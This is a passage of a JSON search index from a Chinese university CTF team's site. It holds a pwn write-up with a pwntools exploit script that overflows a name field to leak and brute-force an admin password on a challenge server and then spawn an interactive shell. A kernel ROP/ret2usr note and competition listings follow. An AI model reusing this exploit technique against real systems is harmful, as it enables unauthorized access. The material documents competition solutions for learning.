teUp/202005/pwn/#_5","text":"\u901a\u8fc7\u6ea2\u51fa\u53ef\u4ee5\u63a7\u5236passwd\u6307\u5411\u7684\u5730\u5740\uff0c\u5e76\u4e14\u7a0b\u5e8f\u4e2d\u5b58\u5728\u7531mmap\u5f00\u8f9f\u7684\u56fa\u5b9a\u5185\u5b58\u57570x600000000000-0x600000004000\uff0c\u6240\u4ee5\u5982\u679c\u628apasswd\u6307\u54110x600000004000-1\uff0c\u90a3\u4e48\u6839\u636e\u7a0b\u5e8f\u7684\u8fd4\u56de\u72b6\u6001\u5c31\u53ef\u4ee5\u5224\u65ad\u7b2c\u4e00\u4e2a\u5b57\u8282\u662f\u5426\u6b63\u786e\uff0c\u6839\u636e\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u628apasswd\u9010\u5b57\u8282\u7206\u7834","title":"\u89e3\u4f53\u601d\u8def"},{"location":"WriteUp/202005/pwn/#exp_1","text":"from pwn import * import time import sys # sh = process(\"./passwd\") # ip = sys.argv[1] #sh = remote(\"172.16.202.302\", 8888) sh = remote ( \"geekgame.scuctf.com\" , 10001 ) # context.log_level = \"debug\" def login ( name , passwd_len , passwd ): sh . recvuntil ( \"[+] Input Your Name: \\n \" ) sh . sendline ( name ) if ( name == \"admin\" ): sh . recvuntil ( \"[+] Input Admin Passwd:\" ) sh . sendline ( passwd ) else : sh . recvuntil ( \"[+] Please Input The Length Of New Passwd: \\n \" ) sh . sendline ( str ( passwd_len )) sh . recvuntil ( \"[+] Input The New Passwd: \\n \" ) sh . sendline ( passwd ) def switch_account ( name , passwd ): sh . recvuntil ( \"[2]:Start A New Article \\n \" ) sh . sendline ( \"1\" ) sh . recvuntil ( \"[+] Are You Sure To Switch Account? yes/no?: \\n \" ) sh . sendline ( \"yes\" ) sh . recvuntil ( \"[+] Input The New Name: \\n \" ) sh . sendline ( name ) sh . recvuntil ( \"[+] Input The Passwd: \\n \" ) sh . sendline ( passwd ) def new_article ( context ): sh . recvuntil ( \"[2]:Start A New Article \\n \" ) sh . sendline ( \"2\" ) sh . recvuntil ( \"[+] Input The Content Of Article(end with '#'): \\n \" ) sh . sendline ( context ) passwd = b \"\" num = 0 addr = 0x600000004000 ppp = 0 while ( num < 19 ): login ( b \"povcfe\" , 22 , b \"aaa\" ) new_article ( b \"aaaa#\" ) addr = addr - 1 payload = b \"admin\" + b \"a\" * 11 + p64 ( addr ) while ( 1 ): ppp = ppp + 1 for i in range ( 0x20 , 0x80 ): try : try_passwd = passwd + chr ( i ) . encode () switch_account ( payload , try_passwd ) except : num = num + 1 passwd = passwd + chr ( i - 1 ) . encode () log . success ( \"one byte is: \" + chr ( i - 1 )) break # sh = process(\"./passwd\") sh . close () # sh = remote(\"172.16.202.132\", 8888) sh = remote ( \"geekgame.scuctf.com\" , 10001 ) break login ( b \"povcfe\" , 22 , b \"aaa\" ) new_article ( \"bbb#\" ) log . success ( str ( ppp )) addr = 0x600000000000 while ( 1 ): payload = b \"admin\" + b \"a\" * 11 + p64 ( addr ) for i in range ( 0x20 , 0x80 ): try_passwd = passwd + chr ( i ) . encode () log . success ( b \"try passwd is: \" + try_passwd ) switch_account ( payload , try_passwd ) time . sleep ( 1 ) sh . sendline ( b \"echo bll\" ) res = sh . recvline () if b \"bll\" in res : sh . interactive () log . success ( \"over\" ) break log . success ( b \"passwd is: \" + try_passwd ) break","title":"exp"},{"location":"WriteUp/202005/pwn/#kernel_rop","text":"\u4e00\uff0eHint\u4e2d\u7ed9\u51fa\u5b66\u4e60\u5185\u6838\u57fa\u7840\u77e5\u8bc6\u7684\u94fe\u63a5\uff0c\u540c\u65f6hint3\u76f4\u63a5\u7ed9\u51fa\u89e3\u9898\u7684\u8be6\u7ec6\u6b65\u9aa4\uff0c\u53ea\u9690\u85cfROP\u6784\u9020\u90e8\u5206\uff0c\u73b0\u5df2\u8865\u5168 \u7ecf\u5178ROP \u4e8c\uff0e\u5185\u6838\u6808\u6ea2\u51fa\u9664\u4e86hint\u7ed9\u51fa\u7684\u7ecf\u5178ROP\u5229\u7528\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528ret2usr\u7684\u5229\u7528\u65b9\u6cd5(\u8fd9\u4e2a\u65b9\u6cd5\u5728hint3\u6240\u7ed9\u94fe\u63a5\u7684\u9694\u58c1\uff0c\u6211\u4e13\u95e8\u628a\u90a3\u7bc7\u6587\u7ae0\u653e\u5728\u4e86\u535a\u5ba2\u9996\u884c\uff0c\u5e76\u4e14\u7ed9\u51fa\u4e86exp\uff0c\u7f16\u8bd1\u4e4b\u540e\u76f4\u63a5\u8fd0\u884c\u5c31\u53ef\u4ee5\u63d0\u6743orz\uff0c\u7adf\u7136\u6ca1\u4eba\u53d1\u73b0) ret2usr","title":"Kernel_rop\uff08\u7b80\u5355\u7684\u5185\u6838\u6808\u6ea2\u51fa\uff09"},{"location":"\u6bd4\u8d5b\u4fe1\u606f/","text":"\u6bd4\u8d5b\u4fe1\u606f\u53d1\u5e03 \u00b6 \u5373\u5c06\u8fdb\u884c\u7684\u6bd4\u8d5b \u00b6 GeekGame2020 \u00b6 \u65f6\u95f4\uff1a2020\u5e745\u6708 \u72b6\u6001\uff1a\u5df2\u7ecf\u7ed3\u675f \u62a5\u540d\u94fe\u63a5\uff1a \u5e73\u53f0\u5730\u5740\uff1a https://geekgame.scuctf.com \u590d\u73b0\u4fdd\u7559\u52302020\u5e746\u670820\u65e5 \u5df2\u7ecf\u7ed3\u675f\u7684\u6bd4\u8d5b \u00b6 GeekGame2019 CTF\u65b0\u751f\u8d5b \u00b6 \u65f6\u95f4\uff1a 2019\u5e7411\u6708 \u72b6\u6001\uff1a\u5df2\u7ecf\u7ed3\u675f \u62a5\u540d\u94fe\u63a5\uff1a \u56db\u5ddd\u5927\u5b66\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u7ade\u8d5b \u00b6 \u65f6\u95f4\uff1a2019\u5e745\u6708 \u72b6\u6001\uff1a\u5df2\u7ecf\u7ed3\u675f \u62a5\u540d\u94fe\u63a5\uff1a 2018\u5e7411\u6708CTF\u9662\u8d5b \u00b6 \u65f6\u95f4\uff1a2018\u5e7411\u6708 \u72b6\u6001\uff1a\u5df2\u7ecf\u7ed3\u675f \u62a5\u540d\u94fe\u63a5\uff1a","title":"\u6bd4\u8d5b\u4fe1\u606f\u53d1\u5e03"},{"location":"\u6bd4\u8d5b\u4fe1\u606f/#_1","text":"","title":"\u6bd4\u8d5b\u4fe1\u606f\u53d1\u5e03"},{"location":"\u6bd4\u8d5b\u4fe1\u606f/#_2","text":"","title":"\u5373\u5c06\u8fdb\u884c\u7684\u6bd4\u8d5b"},{"location":"\u6bd4\u8d5b\u4fe1\u606f/#geekgame2020","text":"\u65f6\u95f4\uff1a2020\u5e745\u6708 \u72b6\u6001\uff1a\u5df2\u7ecf\u7ed3\u675f \u62a5\u540d\u94fe\u63a5\uff1a \u5e73\u53f0\u5730\u5740\uff1a https://geekgame.scuctf.com \u590d\u73b0\u4fdd\u7559\u52302020\u5e746\u670820\u65e5","title":"GeekGame2020"},{"location":"\u6bd4\u8d5b\u4fe1\u606f/#_3","text":"","title":"\u5df2\u7ecf\u7ed3\u675f\u7684\u6bd4\u8d5b"},{"location":"\u6bd4\u8d5b\u4fe1\u606f/#geekgame2019-ctf","text":"\u65f6\u95f4\uff1a 2019\u5e7411\u6708 \u72b6\u6001\uff1a\u5df2\u7ecf\u7ed3\u675f \u62a5\u540d\u94fe\u63a5\uff1a","title":"GeekGame2019 CTF\u65b0\u751f\u8d5b"},{"location":"\u6bd4\u8d5b\u4fe1\u606f/#_4","text":"\u65f6\u95f4\uff1a2019\u5e745\u6708 \u72b6\u6001\uff1a\u5df2\u7ecf\u7ed3\u675f \u62a5\u540d\u94fe\u63a5\uff1a","title":"\u56db\u5ddd\u5927\u5b66\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u7ade\u8d5b"},{"location":"\u6bd4\u8d5b\u4fe1\u606f/#201811ctf","text":"\u65f6\u95f4\uff1a2018\u5e7411\u6708 \u72b6\u6001\uff1a\u5df2\u7ecf\u7ed3\u675f \u62a5\u540d\u94fe\u63a5\uff1a","title":"2018\u5e7411\u6708CTF\u9662\u8d5b"}]}